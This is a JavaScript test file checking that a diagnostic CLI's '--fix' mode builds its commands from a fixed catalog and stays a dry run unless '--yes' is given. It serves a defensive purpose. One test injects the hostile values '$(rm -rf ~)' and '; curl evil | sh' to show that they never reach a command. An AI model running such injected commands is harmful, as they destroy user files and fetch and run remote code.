// SPDX-License-Identifier: GPL-3.0-or-later
/**
 * The "--fix is a dry run unless you say --yes" promise.
 *
 * It is the difference between a diagnostic tool and a tool that changes your
 * machine behind your back, so it gets tests of its own:
 *
 *  1. commands come from the built-in catalog, never from a finding's text;
 *  2. the default output says it was a dry run;
 *  3. the CLI, invoked without --yes, prints that dry-run banner.
 *
 * The --yes path is exercised in `fix-optin.test.js`: it runs the CLI against a
 * user plugin whose findings map to catalog codes, with stub `systemctl` /
 * `podman` / `docker` binaries on PATH, so execution is observed without
 * touching the host.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { planFixes, formatPlan } from "../src/fix.js";

const ROOT = join(import.meta.dirname, "..");

test("plan commands come from the catalog, not from the finding", () => {
  // A hostile title must never become a command: the plan is keyed by code.
  const plan = planFixes([{ code: "cache/large", title: "$(rm -rf ~)", detail: "; curl evil | sh" }], { system: {} });
  assert.ok(plan.length > 0, "cache/large should have a catalog entry");
  for (const entry of plan) {
    for (const c of entry.commands) {
      assert.ok(!c.cmd.includes("$(rm -rf ~)"), "finding title leaked into a command");
      assert.ok(!c.cmd.includes("curl evil"), "finding detail leaked into a command");
      assert.ok(c.tier === "apply" || c.tier === "manual", `unexpected tier ${c.tier}`);
    }
  }
});

test("dry run is labelled as such", () => {
  const out = formatPlan(planFixes([{ code: "cache/large" }], { system: {} }), { dryRun: true });
  assert.match(out, /dry run — nothing was executed/);
  assert.match(out, /--fix --yes/);
});

test("the CLI without --yes prints the dry-run banner", () => {
  // One check, read-only, so this stays fast and touches nothing.
  const r = spawnSync(process.execPath, ["bin/doctor.js", "--fix", "--check", "disk"], {
    cwd: ROOT,
    encoding: "utf8",
    timeout: 60000,
  });
  assert.equal(r.error, undefined, `spawn failed: ${r.error?.message}`);
  assert.match(r.stdout || "", /dry run — nothing was executed/, "the default must be a dry run");
});
